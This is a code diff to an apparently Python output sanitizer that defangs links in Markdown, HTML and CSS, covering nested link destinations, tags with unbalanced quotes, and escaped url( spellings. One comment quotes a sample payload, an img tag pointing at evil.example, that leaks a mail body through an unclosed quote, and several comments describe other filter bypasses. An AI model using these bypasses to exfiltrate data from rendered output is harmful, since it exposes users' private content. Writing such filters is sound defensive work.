@@ -454,6 +454,64 @@ def _neutralize_formulas(text, notes, allowed=frozenset()):
     return "".join(out)
 
 
+def _defang_md_inline_links(text, allowed, notes):
+    """Every inline link / image `[text](dest "title")` whatever the bracket depth of the text or the paren
+    depth of the destination (CommonMark allows both to be arbitrary, so a fixed-depth regex is a bypass --
+    found in review). Scans for `](`, walks the destination with paren balance, then rewrites it."""
+    out, pos, i = [], 0, 0
+    n = len(text)
+    while True:
+        j = text.find("](", i)
+        if j == -1:
+            break
+        k = j + 2                                        # first char of the destination region
+        while k < n and text[k] in " \t":
+            k += 1
+        if k < n and text[k] == "<":                     # <dest>
+            e = text.find(">", k)
+            if e == -1 or "\n" in text[k:e]:
+                i = j + 2; continue
+            dest_s, dest_e = k, e + 1
+        else:
+            depth, e = 0, k
+            while e < n:
+                c = text[e]
+                if c in " \t\n":
+                    break
+                if c == "(":
+                    depth += 1
+                elif c == ")":
+                    if depth == 0:
+                        break
+                    depth -= 1
+                e += 1
+            if depth != 0 or e == k:
+                i = j + 2; continue
+            dest_s, dest_e = k, e
+        # optional title, then the closing paren
+        t = dest_e
+        while t < n and text[t] in " \t\n":
+            t += 1
+        if t < n and text[t] in "\"'(":
+            close = {"\"": "\"", "'": "'", "(": ")"}[text[t]]
+            te = text.find(close, t + 1)
+            if te == -1:
+                i = j + 2; continue
+            t = te + 1
+            while t < n and text[t] in " \t\n":
+                t += 1
+        if t >= n or text[t] != ")":
+            i = j + 2; continue
+        target = text[dest_s:dest_e]
+        d = _defang_target(target, allowed)
+        if d != target:
+            notes.append({"type": "link", "original": target[:60]})
+            out.append(text[pos:dest_s]); out.append(d); pos = dest_e
+        i = t + 1
+    out.append(text[pos:])
+    return "".join(out)
+
+
 # --- HTML (#147 / #119 item 3) -----------------------------------------------------------------------------
 # A tag-and-attribute pass, not a DOM: it rewrites what a mail client or a renderer would act on and leaves
 # everything else byte-identical. Order inside the pass: elements that execute are removed or made inert,
@@ -469,6 +527,32 @@ _HTML_INERT_TAGS = r"form|meta|base|link|input|button|select|textarea|" + _HTML_
 _HTML_INERT_TAG_RE = re.compile(r"<(?=\s*/?\s*(?:" + _HTML_INERT_TAGS + r")\b)", re.IGNORECASE)
 # A tag with its attribute region; quoted values may contain '>' without ending the tag.
 _HTML_TAG_RE = re.compile(r"<(/?)([a-zA-Z][\w:.-]*)((?:\"[^\"]*\"|'[^']*'|[^'\">])*)>")
+# A tag opener whose attribute region opens a quote it never closes before the next '>' -- to an HTML5
+# tokenizer the quoted value runs on until the NEXT quote in the document, swallowing the '>' and whatever
+# follows, so `<img src="https://evil.example/x?a=1><p>host "acme"` becomes a live fetch with the rest of
+# the mail in its query string. _HTML_TAG_RE (balanced quotes) cannot match it and the mail-text splitter
+# treats it as a tag: it fell through both. The opener is escaped so the renderer sees text (found in
+# review, 2026-09-05).
+_HTML_BROKEN_OPENER_RE = re.compile(r"<(?=[a-zA-Z])")
+
+
+def _escape_broken_openers(text, notes):
+    out, pos = [], 0
+    for m in _HTML_BROKEN_OPENER_RE.finditer(text):
+        i = m.start()
+        if i < pos:
+            continue
+        if _HTML_TAG_RE.match(text, i):                  # a well-formed tag: leave it
+            continue
+        end = text.find(">", i)
+        region = text[i:end if end != -1 else len(text)]
+        if region.count('"') % 2 == 1 or region.count("'") % 2 == 1:
+            notes.append({"type": "html_strip", "original": "unbalanced quote in tag"})
+            out.append(text[pos:i]); out.append("&lt;"); pos = i + 1
+    out.append(text[pos:])
+    return "".join(out)
+
+
 _HTML_HANDLER_RE = re.compile(r"""[\s/]+on[\w-]+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)""", re.IGNORECASE)
 _HTML_URL_ATTRS = (r"href|src|action|formaction|poster|background|ping|cite|longdesc|usemap|data|"
                    r"xlink:href|dynsrc|lowsrc|manifest|codebase|classid|srcdoc|srcset|style")
@@ -476,7 +560,22 @@ _HTML_URL_ATTR_RE = re.compile(
     r"""(?P<lead>[\s/]+)(?P<name>""" + _HTML_URL_ATTRS + r""")(?P<eq>\s*=\s*)(?:"(?P<dq>[^"]*)"|'(?P<sq>[^']*)'|(?P<uq>[^\s>]+))""",
     re.IGNORECASE | re.DOTALL)
 _INERT_SCHEMES = {"hxxp", "hxxps", "fxp", "fxps"}          # our own output; never re-defanged (idempotency)
-_CSS_URL_RE = re.compile(r"""(url\(\s*(['"]?))([^)'"]*)((?:\2)\s*\))|(@import\s+(['"]?))([^'";\s]+)""", re.IGNORECASE)
+_CSS_URL_RE = re.compile(
+    r"""(url\(\s*(['"]?))([^)'"]*)((?:\2)\s*\))|(@import\s+(['"]?))([^'";\s]+)|((?:-webkit-)?image-set\(\s*(['"]))([^'"]+)(\9)""",
+    re.IGNORECASE)
+# CSS lets an ident be spelled with backslash escapes: \75rl( is url(. Decode them before deciding.
+_CSS_ESCAPE_RE = re.compile(r"\\([0-9a-fA-F]{1,6})[ \t\n]?|\\([^0-9a-fA-F\n])")
+
+
+def _css_unescape(css):
+    def _u(m):
+        if m.group(1):
+            try:
+                return chr(int(m.group(1), 16))
+            except (ValueError, OverflowError):
+                return ""
+        return m.group(2)
+    return _CSS_ESCAPE_RE.sub(_u, css)
 _STYLE_BLOCK_RE = re.compile(r"(<\s*style\b[^>]*>)(.*?)(<\s*/\s*style\s*>)", re.IGNORECASE | re.DOTALL)
 _ANY_SCHEME_RE = re.compile(r"^\s*([a-zA-Z][a-zA-Z0-9+.-]*):")
 
@@ -513,14 +612,24 @@ def _defang_attr_value(decoded, allowed, notes, kind, keep_relative=True):
 
 
 def _neutralize_css(css, allowed, notes):
+    # Escaped spellings (\75rl( ) are decoded only when they hide a fetch token; ordinary CSS is untouched.
+    dec = _css_unescape(css)
+    if dec != css and re.search(r"(?i)url\s*\(|@import|image-set\s*\(", dec) and not re.search(r"(?i)url\s*\(|@import|image-set\s*\(", css):
+        notes.append({"type": "html_css", "original": "css escape hid a fetch token"})
+        css = dec
+
     def _u(m):
         if m.group(1):                                   # url(...)
             target = m.group(3)
             d = _defang_attr_value(target, allowed, notes, "html_css")
             return m.group(0) if d is None else m.group(1) + d + m.group(4)
-        target = m.group(7)                              # @import
+        if m.group(5):                                   # @import
+            target = m.group(7)
+            d = _defang_attr_value(target, allowed, notes, "html_css")
+            return m.group(0) if d is None else m.group(5) + d
+        target = m.group(10)                             # image-set('...')
         d = _defang_attr_value(target, allowed, notes, "html_css")
-        return m.group(0) if d is None else m.group(5) + d
+        return m.group(0) if d is None else m.group(8) + d + m.group(11)
     css = _CSS_URL_RE.sub(_u, css)
     # expression() and -moz-binding are script vectors in legacy engines; make them inert
     return re.sub(r"(?i)\b(expression|-moz-binding)\s*\(", r"\1[(]", css)
@@ -598,6 +707,7 @@ def _neutralize_html(text, notes, allowed=frozenset(), mail=False):
     text = _HTML_INERT_TAG_RE.sub(_inert, text)
 
     text = _HTML_TAG_RE.sub(lambda m: _neutralize_tag(m, allowed, notes), text)
+    text = _escape_broken_openers(text, notes)
 
     if mail:
         # A mail client auto-links a bare URL in text, so in a mail body bare is clickable: defang every
@@ -656,13 +766,7 @@ def neutralize_output(text, allowed_hosts=frozenset(), mail=False):
     # shapes a fixture happens to cover: by the time the redactor runs, the host is already inert, so
     # whatever it consumes it cannot re-arm a link. Redaction still sees the query value verbatim (defang
     # rewrites the scheme and host, never the query string), so nothing is lost.
-    def _link(m):
-        target = m.group(2)
-        d = _defang_target(target, allowed)
-        if d != target:
-            notes.append({"type": "link", "original": target[:60]})
-        return m.group(1) + d + m.group(3)
-    text = _MD_LINK_RE.sub(_link, text)
+    text = _defang_md_inline_links(text, allowed, notes)
 
     text = redact_secrets(text, notes)
 
